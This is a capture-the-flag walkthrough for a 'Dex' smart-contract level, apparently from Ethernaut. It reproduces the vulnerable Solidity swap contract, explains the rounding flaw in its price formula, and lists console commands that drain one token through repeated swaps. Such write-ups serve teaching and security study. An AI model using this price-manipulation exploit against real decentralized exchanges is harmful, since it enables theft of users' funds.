# 22 Dex

```
The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.

You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.

You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the 

contract to report a "bad" price of the assets.

 

Quick note
Normally, when you make a swap with an ERC20 token, you have to approve the contract to spend your tokens for you. To 

keep with the syntax of the game, we've just added the approve method to the contract itself. So feel free to use 

contract.approve(contract.address, <uint amount>) instead of calling the tokens directly, and it will automatically 

approve spending the two tokens by the desired amount. Feel free to ignore the SwappableToken contract otherwise.

  Things that might help:

How is the price of the token calculated?
How does the swap method work?
How do you approve a transaction of an ERC20?
Theres more than one way to interact with a contract!
Remix might help
What does "At Address" do?
```
####  code
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract Dex is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}


```




#### Start 


### (1) `drain all of at least 1 of the 2 tokens from the contract`

You need to have some basic knowledge about Dex (Decentralized Exchange) first 

I recommend you to search this on google and learn about it yourself


.

.

Let's look at the code, how do we attack it?

I don't watch about functions with modifier onlyOwner and SwappableToken contracts. because they are unnecessary

.

.

- This function simply approves the number of tokens that you will allow the contract Dex to transfer your token.
```
  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

```

- This function just returns the number of token for that address.
```
  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }

```

- This function is to swap tokens between 2 tokens

   There are two conditions:

       1. Check the addresses of both tokens are correct or not.
       2. Check the amount token of msg.sender  is enough to swap?

  The important part is `uint swapAmount = getSwapPrice(from, to, amount);`  
  
  call `getSwapPrice(from, to, amount)` to find the number of tokens to be transferred.
```
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }
```


- This function calculates the tokens received after the swap
```
   function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }


```


Looking at all the functions, where do you think you can attack from?

.

.

.

We will attack from `getSwapPrice()`

Because if we look at the calculation equation 
```
(amount * balance contract Dex tokenBuy )/(balance contract Dex tokenSell )
```

We want to drain all of at least 1 of the 2 tokens from the contract, 

meaning we need  more token than we originally had 10 token1 10 token2.


.

.
#### Things to know

Before calculating you need to know some problems in solidty `rounding error`

in solidty floating point variables do not exist 
```
Since the type of the result of an operation is always the type of one of the operands,

division on integers always results in an integer. In Solidity, division rounds towards zero.

Source: Solidity documentation

example :
                            normal         solidity
       (20 * 110)/90  =     24.44             20
                                    
       5/2            =      2.50              2
```
.

.

From the equation 

    if we sell all 10 token1, we will get 10 token2.

    token2 = (10 * 100 )/100
    token2 = 10
    
    will have 20 token 2  and 0 token1  Looks like nothing seemed strange

    But if you buy token1 again with all the token2 you have. The equation will change
    token1 = (20 * 110 )/90
    token1 = 24
    will have 24 token 1 and 0 token2  You see? 

    we originally had token1 10 token2 10 and the total was 20, but now we have 24. 
    We can attack from swap agin and agin 


Let's start the calculations
```
|-------------------------------------------------------|
| time |     balance Dex      |       balance User      |
|      |  token1  |  token2   |   token1   |  token2    |
|-------------------------------------------------------|
| 0        100         100         10           10      |
| 1        110          90          0           20      |
| 2         86         110         24            0      |
| 3        110          80          0           30      |
| 4         69         110         41            0      |
| 5        110          45          0           65      |
|-------------------------------------------------------|
```

Why did I stop here?

Because if you try to calculate When selling all token2 to buy token1, 
```
    token1 = (65 * 110 )/45
    token1 = 158
```
which token1 balnce contract dex is not enough and will error so we need to find exact amount

now balnce token1 in contact dex have 110 we need all token1 

So we calculate the reverse equation
``` 
    token1 = 110   amount = ?   balance contract Dex tokenBuy = 110   balance contract Dex tokenSell = 45

    token1 = (amount * balance contract Dex tokenBuy )/ balance contract Dex tokenSell

                                                 |   
                                                 |
                                                 |
                                                            
    110    =  ( amount * 110 ) / 45
    amount =  45
```
The last swap with 45 token2  will give us 110 token1 and  balance token1 in the contract dex will be 0  Complete the attack.


#### Open Developer Tools (F12)

- (1) type  `await contract.approve(contract.address,toWei('1000'))`                     and confirm transaction
- (2) type  `await contract.swap(await contract.token1(), await contract.token2(), 10)`  and confirm transaction
- (2) type  `await contract.swap(await contract.token2(), await contract.token1(), 20)`  and confirm transaction
- (3) type  `await contract.swap(await contract.token1(), await contract.token2(), 24)`  and confirm transaction
- (4) type  `await contract.swap(await contract.token2(), await contract.token1(), 30)`  and confirm transaction
- (5) type  `await contract.swap(await contract.token1(), await contract.token2(), 41)`  and confirm transaction
- (6) type  `await contract.swap(await contract.token2(), await contract.token1(), 45)`  and confirm transaction


Click button Submit instance and confirm transaction 

# !!! we passed !!!

